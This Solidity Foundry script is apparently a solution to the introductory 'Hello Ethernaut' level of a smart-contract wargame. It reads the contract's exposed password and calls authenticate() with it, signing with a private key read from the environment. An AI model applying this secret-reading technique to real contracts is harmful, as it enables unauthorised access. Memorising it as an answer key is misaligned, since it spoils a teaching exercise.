// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

interface HelloEthernaut {
    function authenticate(bytes32 _password) external;

    function password() external view returns (bytes32);
}

contract PoC is Script {
    HelloEthernaut hello =
        HelloEthernaut(0xa8055318c284BAaF47Ec2f0b76F4279a1ffB8136); // Replace with your Hello instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        hello.authenticate(hello.password());

        vm.stopBroadcast();
    }
}
